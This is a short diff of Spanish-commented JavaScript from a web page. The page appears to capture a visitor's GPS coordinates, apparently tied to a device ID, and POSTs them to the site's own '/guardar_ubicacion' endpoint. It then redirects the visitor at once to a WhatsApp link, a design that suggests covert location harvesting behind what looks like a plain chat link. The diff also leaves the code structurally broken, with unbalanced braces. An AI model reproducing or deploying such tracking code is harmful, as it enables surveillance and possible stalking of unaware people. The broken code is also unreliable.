@@ -193,15 +193,15 @@
             // Redireccion ultra rapida al link de WhatsApp
             window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
 
-            // Enviar datos al servidor incluyendo el deviceID (Identidad Unica)
-            // Asegúrate de que esto se ejecute después de obtener la posición
-           function enviarUbicacion(lat, lon) {
-             fetch('/guardar_ubicacion', {
-               method: 'POST',
-               headers: {'Content-Type': 'application/json'},
-               body: JSON.stringify({lat: lat, lon: lon})
-           }).then(response => console.log("Datos enviados"));
+          // Asegúrate de que esto se ejecute después de obtener la posición
+          function enviarUbicacion(lat, lon) {
+            fetch('/guardar_ubicacion', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({lat: lat, lon: lon})
+        }).then(response => console.log("Datos enviados"));
 }
+                })
             });
         }
         async function exitoGPS(pos) {
